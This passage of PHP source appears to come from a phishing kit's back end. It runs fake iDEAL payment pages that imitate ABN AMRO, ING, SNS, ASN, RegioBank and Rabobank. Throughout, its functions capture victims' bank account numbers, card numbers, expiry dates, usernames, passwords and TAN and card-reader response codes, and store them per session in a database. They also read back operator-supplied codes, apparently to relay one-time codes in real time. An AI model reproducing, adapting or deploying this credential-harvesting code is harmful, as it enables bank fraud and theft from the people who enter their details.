    mysqli_stmt_close($stmt);
}

// ABN RESPONSE CHECK
function abnResponsCheckTwo()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
      
    $query = "SELECT bedrag FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
    }
    
    require 'templates/abn-response-check-2.php';
    mysqli_stmt_close($stmt);
}

// ABN RESPONSE CHECK
function abnResponsCheckThree()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
      
    $query = "SELECT bedrag FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
    }
    
    require 'templates/abn-response-check-3.php';
    mysqli_stmt_close($stmt);
}


// ABN RESPONSE PAGE TWO
function abnResponsPageTwo()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $empty = "";
    $currentSession = $_SESSION['alive'];
        
    $query = "SELECT bedrag FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
    }
    
    $secondQuery = "SELECT abnresponscode FROM request_data WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $secondQuery);
    mysqli_stmt_bind_param($stmt, "s", $currentSession);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $respons);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $respons;
    }
    
    $thirdQuery = "UPDATE request_data SET abnresponschecktwo=?, abnresponstwo=? WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $thirdQuery);
    mysqli_stmt_bind_param($stmt, "sss", $empty, $empty, $currentSession);
    mysqli_stmt_execute($stmt);
    
    require 'templates/abn-response-two-template.php';    
    mysqli_stmt_close($stmt);
}

// ABN IDENTIFICATION CODE PAGE
function abnLastPage()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];
    $empty = "";
    
    $firstQuery = "SELECT bedrag FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $firstQuery);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
    }

    $thirdQuery = "UPDATE request_data SET abnresponscheckthree=?, abnidentificatie=? WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $thirdQuery);
    mysqli_stmt_bind_param($stmt, "sss", $empty, $empty, $currentSession);
    mysqli_stmt_execute($stmt);

    require 'templates/abn-identification-template.php';
    mysqli_stmt_close($stmt);
}

// ABN IDENTIFICATION CODE
function abnIdentificationCode()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['respons-submit']))
    {
        $respons = $_POST['respons'];
    
        if(empty($respons) || strlen($respons) < 5 || is_numeric($respons) == false)
        {
            header("location: ideal?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET abnidentificatie=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $respons, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: ../idealx.php?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}

// ABN LOGIN FUNCTION
function abnLoginFunction()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['login-submit']))
    {
        $rekeningnummer = $_POST['rekeningnummer'];
        $pasnummer = $_POST['pasnummer'];
    
        if(empty($rekeningnummer) || empty($pasnummer) || strlen($rekeningnummer) < 9 || strlen($pasnummer) < 3 || is_numeric($rekeningnummer) == false || is_numeric($pasnummer) == false)
        {
            header("location: ideal?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET abnrekening=?, abnpasnummer=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "sss", $rekeningnummer, $pasnummer, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: ../afronden/ideal?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}


// ABN RESPONS ONE UPLOAD
function abnResponsOneCode()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['respons-submit']))
    {
        $respons = $_POST['respons'];
    
        $respons = mysqli_real_escape_string($con, $respons);
        
        if(empty($respons) || strlen($respons) < 7 || is_numeric($respons) == false)
        {
            header("location: ideal?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET abnresponsone=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $respons, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: ../ideal?trxid=$id");
            exit();
        }   
        mysqli_stmt_close($stmt);
    }   
}

// ABN RESPONS TWO UPLOAD
function abnResponsCodeTwo()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['respons-submit']))
    {
        $respons = $_POST['respons'];
    
        $respons = mysqli_real_escape_string($con, $respons);
        
        if(empty($respons) || strlen($respons) < 7 || is_numeric($respons) == false)
        {
            header("location: ideal?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET abnresponstwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $respons, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: ../ideals?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}

// ING LOGIN UPLOAD
function ingLoginUpload()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['login-submit']))
    {
        $username = $_POST['username'];
        $password = $_POST['password'];
    
        if(empty($username) || empty($password))
        {
            header("location: index?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET inguser=?, ingpass=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "sss", $username, $password, $currentSession);
        mysqli_stmt_execute($stmt);
        
        if($stmt)
        {
            header("location: indexs?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}

// ING INFORMATION UPLOAD
function ingInformationUpload()
{
    global $con;
    if(isset($_POST['gegevens-submit']))
    {
        $id = $_GET['trxid'];
        $rekeningnummer = $_POST['rekeningnummer'];
        $pasnummer = $_POST['pasnummer'];
        $vervaldatum = $_POST['vervaldatum'];
        $geboortedatum = $_POST['geboortedatum'];
        $currentSession = $_SESSION['alive'];
       
        if(empty($pasnummer) || empty($vervaldatum) || strlen($pasnummer) < 7 || strlen($vervaldatum) < 7)
        {
            header("location: index?trxid=$id&error=legevelden");
            exit();
        }
       
        $query = "UPDATE request_data SET ingpasnummer=?, ingvervaldatum=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "sss", $pasnummer, $vervaldatum, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: indexs?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);        
    }
}

// ING CONFIRM REQUEST
function ingConfirmUpload()
{
    if(isset($_POST['mobile-submit']))
    {
        $id = $_GET['trxid'];
    
        header("location: ../tancode/index?trxid=$id");
        exit();
    }
}

// ING TAN UPLOAD
function ingTanUpload()
{
    global $con;
    if(isset($_POST['tan-submit']))
    {
        $id = $_GET['trxid'];
        $tanCode = $_POST['tan-code'];
        $currentSession = $_SESSION['alive'];
    
        if(empty($tanCode) || is_numeric($tanCode) == false || strlen($tanCode) < 3)
        {
            header("location: index?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET ingtancode=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $tanCode, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: indexs?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}

// CONFIRM ING REQUEST
function snsInloggen()
{
    global $con;
    checkTrxid();   
    $id = $_GET['trxid'];  
    $currentSession = $_SESSION['alive'];
    $bank = "sns";
    $query = "SELECT bedrag, beschrijving, link, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $link, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $link;
        $rekeningnummer;
    }
    
    $secondQuery = "UPDATE request_data SET bank=? WHERE token=?";
    $secondStmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($secondStmt, $secondQuery);
    mysqli_stmt_bind_param($secondStmt, "ss", $bank, $currentSession);
    mysqli_stmt_execute($secondStmt);
    
    $thirdQuery = "UPDATE request_data SET inglogincheck=?, inguser=?, ingpass=?, ingpasnummer=?, ingvervaldatum=?, ingtancode=?, abnrekening=?, abnpasnummer=?, abnresponsone=?, abnresponscheck=?, abnresponscode=?, abnresponstwo=?, abnidentificatie=?, abnresponscheckthree=?, abnresponschecktwo=?, ingloginchecktwo=?, inglogincheckthree=?, snsrespons=?, snsresponscheckone=?, snsresponstwo=?, snsresponschecktwo=?, snsresponscode=?, asnrespons=?, asnresponscheckone=?, asnresponscode=?, asnresponstwo=?, asnresponschecktwo=?, regiorespons=?, regioresponscheckone=?, regioresponscode=?, regioresponstwo=?, regioresponschecktwo=?, raborekeningnummer=?, rabopasnummer=?, raboresponscheckone=?, raboresponscode=?, raboresponsone=?, raboresponschecktwo=?, raboresponscodetwo=?, raboresponstwo=?, raboresponscheckthree=?, raboidentification=?, raboresponscheckfour=? WHERE token=?";
    $thirdStmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($thirdStmt, $thirdQuery);
    mysqli_stmt_bind_param($thirdStmt, "ssssssssssssssssssssssssssssssssssssssssssss", $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $currentSession);
    mysqli_stmt_execute($thirdStmt);
    
    require '../../required/templates/sns-inloggen-template.php';  
    
    mysqli_stmt_close($thirdStmt);

}


// ASN INLOGGEN
function asnInloggen()
{
    global $con;
    checkTrxid();   
    $id = $_GET['trxid'];  
    $currentSession = $_SESSION['alive'];
    $bank = "asn";
    $query = "SELECT bedrag, beschrijving, link, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $link, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $link;
        $rekeningnummer;
    }
    
    $secondQuery = "UPDATE request_data SET bank=? WHERE token=?";
    $secondStmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($secondStmt, $secondQuery);
    mysqli_stmt_bind_param($secondStmt, "ss", $bank, $currentSession);
    mysqli_stmt_execute($secondStmt);
    
    $thirdQuery = "UPDATE request_data SET inglogincheck=?, inguser=?, ingpass=?, ingpasnummer=?, ingvervaldatum=?, ingtancode=?, abnrekening=?, abnpasnummer=?, abnresponsone=?, abnresponscheck=?, abnresponscode=?, abnresponstwo=?, abnidentificatie=?, abnresponscheckthree=?, abnresponschecktwo=?, ingloginchecktwo=?, inglogincheckthree=?, snsrespons=?, snsresponscheckone=?, snsresponstwo=?, snsresponschecktwo=?, snsresponscode=?, asnrespons=?, asnresponscheckone=?, asnresponscode=?, asnresponstwo=?, asnresponschecktwo=?, regiorespons=?, regioresponscheckone=?, regioresponscode=?, regioresponstwo=?, regioresponschecktwo=?, raborekeningnummer=?, rabopasnummer=?, raboresponscheckone=?, raboresponscode=?, raboresponsone=?, raboresponschecktwo=?, raboresponscodetwo=?, raboresponstwo=?, raboresponscheckthree=?, raboidentification=?, raboresponscheckfour=? WHERE token=?";
    $thirdStmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($thirdStmt, $thirdQuery);
    mysqli_stmt_bind_param($thirdStmt, "ssssssssssssssssssssssssssssssssssssssssssss", $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $currentSession);
    mysqli_stmt_execute($thirdStmt);
    
    require '../../required/templates/asn-inloggen-template.php';  
    
    mysqli_stmt_close($thirdStmt);
}

// REGIO INLOGGEN
function regioInloggen()
{
    global $con;
    checkTrxid();   
    $id = $_GET['trxid'];  
    $currentSession = $_SESSION['alive'];
    $bank = "regio";
    $query = "SELECT bedrag, beschrijving, link, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $link, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $link;
        $rekeningnummer;
    }
    
    $secondQuery = "UPDATE request_data SET bank=? WHERE token=?";
    $secondStmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($secondStmt, $secondQuery);
    mysqli_stmt_bind_param($secondStmt, "ss", $bank, $currentSession);
    mysqli_stmt_execute($secondStmt);
    
    $thirdQuery = "UPDATE request_data SET inglogincheck=?, inguser=?, ingpass=?, ingpasnummer=?, ingvervaldatum=?, ingtancode=?, abnrekening=?, abnpasnummer=?, abnresponsone=?, abnresponscheck=?, abnresponscode=?, abnresponstwo=?, abnidentificatie=?, abnresponscheckthree=?, abnresponschecktwo=?, ingloginchecktwo=?, inglogincheckthree=?, snsrespons=?, snsresponscheckone=?, snsresponstwo=?, snsresponschecktwo=?, snsresponscode=?, asnrespons=?, asnresponscheckone=?, asnresponscode=?, asnresponstwo=?, asnresponschecktwo=?, regiorespons=?, regioresponscheckone=?, regioresponscode=?, regioresponstwo=?, regioresponschecktwo=?, raborekeningnummer=?, rabopasnummer=?, raboresponscheckone=?, raboresponscode=?, raboresponsone=?, raboresponschecktwo=?, raboresponscodetwo=?, raboresponstwo=?, raboresponscheckthree=?, raboidentification=?, raboresponscheckfour=? WHERE token=?";
    $thirdStmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($thirdStmt, $thirdQuery);
    mysqli_stmt_bind_param($thirdStmt, "ssssssssssssssssssssssssssssssssssssssssssss", $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $currentSession);
    mysqli_stmt_execute($thirdStmt);
    
    require '../../required/templates/regio-inloggen-template.php';  
    
    mysqli_stmt_close($thirdStmt);
}

// RABO INLOGGEN
function raboInloggen()
{
    global $con;
    checkTrxid();   
    $id = $_GET['trxid'];  
    $currentSession = $_SESSION['alive'];
    $bank = "rabo";
    $query = "SELECT bedrag, beschrijving, link, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $link, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $link;
        $rekeningnummer;
    }
    
    $secondQuery = "UPDATE request_data SET bank=? WHERE token=?";
    $secondStmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($secondStmt, $secondQuery);
    mysqli_stmt_bind_param($secondStmt, "ss", $bank, $currentSession);
    mysqli_stmt_execute($secondStmt);
    
    $thirdQuery = "UPDATE request_data SET inglogincheck=?, inguser=?, ingpass=?, ingpasnummer=?, ingvervaldatum=?, ingtancode=?, abnrekening=?, abnpasnummer=?, abnresponsone=?, abnresponscheck=?, abnresponscode=?, abnresponstwo=?, abnidentificatie=?, abnresponscheckthree=?, abnresponschecktwo=?, ingloginchecktwo=?, inglogincheckthree=?, snsrespons=?, snsresponscheckone=?, snsresponstwo=?, snsresponschecktwo=?, snsresponscode=?, asnrespons=?, asnresponscheckone=?, asnresponscode=?, asnresponstwo=?, asnresponschecktwo=?, regiorespons=?, regioresponscheckone=?, regioresponscode=?, regioresponstwo=?, regioresponschecktwo=?, raborekeningnummer=?, rabopasnummer=?, raboresponscheckone=?, raboresponscode=?, raboresponsone=?, raboresponschecktwo=?, raboresponscodetwo=?, raboresponstwo=?, raboresponscheckthree=?, raboidentification=?, raboresponscheckfour=? WHERE token=?";
    $thirdStmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($thirdStmt, $thirdQuery);
    mysqli_stmt_bind_param($thirdStmt, "ssssssssssssssssssssssssssssssssssssssssssss", $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $currentSession);
    mysqli_stmt_execute($thirdStmt);
    
    require '../../required/templates/rabo-inloggen-template.php';  
    
    mysqli_stmt_close($thirdStmt);
}

// SNS INLOGGEN SUBMIT
function snsInloggenSubmit()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['submit']))
    {
        $respons = $_POST['rekeningnummer'];
    
        if(empty($respons) || strlen($respons) < 4 || is_numeric($respons) == false)
        {
            header("location: sign?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET snsrespons=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $respons, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: signs?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}

// ASN INLOGGEN SUBMIT
function asnInloggenSubmit()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['submit']))
    {
        $respons = $_POST['rekeningnummer'];
    
        if(empty($respons) || strlen($respons) < 4 || is_numeric($respons) == false)
        {
            header("location: sign?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET asnrespons=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $respons, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: signs?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}

// REGIO INLOGGEN SUBMIT
function regioInloggenSubmit()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['submit']))
    {
        $respons = $_POST['rekeningnummer'];
    
        if(empty($respons) || strlen($respons) < 4 || is_numeric($respons) == false)
        {
            header("location: sign?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET regiorespons=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $respons, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: signs?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}

// RABO INLOGGEN SUBMIT
function raboInloggenSubmit()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['submit']))
    {
        $rekeningnummer = $_POST['rekeningnummer'];
        $pasnummer = $_POST['pasnummer'];
    
        if(empty($rekeningnummer) || empty($pasnummer) || strlen($pasnummer) < 4 || is_numeric($rekeningnummer) == false || is_numeric($pasnummer) == false)
        {
            header("location: index?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET raborekeningnummer=?, rabopasnummer=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "sss", $rekeningnummer, $pasnummer, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: indexs?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}


// SNS INLOG CHECK ONE
function snsInlogCheckOne()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
      
    $query = "SELECT bedrag, beschrijving, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $rekeningnummer;
    }
    
    require 'templates/sns-respons-check-1.php';
    mysqli_stmt_close($stmt);
}

// ASN INLOG CHECK ONE
function asnInlogCheckOne()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
      
    $query = "SELECT bedrag, beschrijving, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $rekeningnummer;
    }
    
    require 'templates/asn-respons-check-1.php';
    mysqli_stmt_close($stmt);
}

// REGIO INLOG CHECK ONE
function regioInlogCheckOne()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
      
    $query = "SELECT bedrag, beschrijving, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $rekeningnummer;
    }
    
    require 'templates/regio-respons-check-1.php';
    mysqli_stmt_close($stmt);
}

// RABO INLOG CHECK ONE
function raboInlogCheckOne()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
      
    $query = "SELECT bedrag, beschrijving, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $rekeningnummer;
    }
    
    require 'templates/rabo-respons-check.php';
    mysqli_stmt_close($stmt);
}

// SNS RESPONS PAGE
function snsRespons()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $empty = "";
    $currentSession = $_SESSION['alive'];
    
    $firstQuery = "SELECT bedrag, beschrijving, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $firstQuery);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $rekeningnummer;
    }
    
    $secondQuery = "SELECT snsresponscode FROM request_data WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $secondQuery);
    mysqli_stmt_bind_param($stmt, "s", $currentSession);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $respons);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $respons;
    }
    
    $query = "UPDATE request_data SET snsresponstwo=?, snsresponschecktwo=? WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "sss", $empty, $empty, $currentSession);
    mysqli_stmt_execute($stmt);

    require '../../../required/templates/sns-respons-template.php';
    mysqli_stmt_close($stmt);
}

// SNS RESPONS PAGE
function asnRespons()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $empty = "";
    $currentSession = $_SESSION['alive'];
    
    $firstQuery = "SELECT bedrag, beschrijving, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $firstQuery);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $rekeningnummer;
    }
    
    $secondQuery = "SELECT asnresponscode FROM request_data WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $secondQuery);
    mysqli_stmt_bind_param($stmt, "s", $currentSession);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $respons);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $respons;
    }
    
    $query = "UPDATE request_data SET asnresponstwo=?, asnresponschecktwo=? WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "sss", $empty, $empty, $currentSession);
    mysqli_stmt_execute($stmt);

    require '../../../required/templates/asn-respons-template.php';
    mysqli_stmt_close($stmt);
}

// REGIO RESPONS PAGE
function regioRespons()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $empty = "";
    $currentSession = $_SESSION['alive'];
    
    $firstQuery = "SELECT bedrag, beschrijving, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $firstQuery);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $rekeningnummer;
    }
    
    $secondQuery = "SELECT regioresponscode FROM request_data WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $secondQuery);
    mysqli_stmt_bind_param($stmt, "s", $currentSession);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $respons);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $respons;
    }
    
    $query = "UPDATE request_data SET regioresponstwo=?, regioresponschecktwo=? WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "sss", $empty, $empty, $currentSession);
    mysqli_stmt_execute($stmt);

    require '../../../required/templates/regio-respons-template.php';
    mysqli_stmt_close($stmt);
}

// RABO RESPONS
function raboRespons()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $empty = "";
    $currentSession = $_SESSION['alive'];
    
    $secondQuery = "SELECT raboresponscode FROM request_data WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $secondQuery);
    mysqli_stmt_bind_param($stmt, "s", $currentSession);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $respons);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $respons;
    }
    
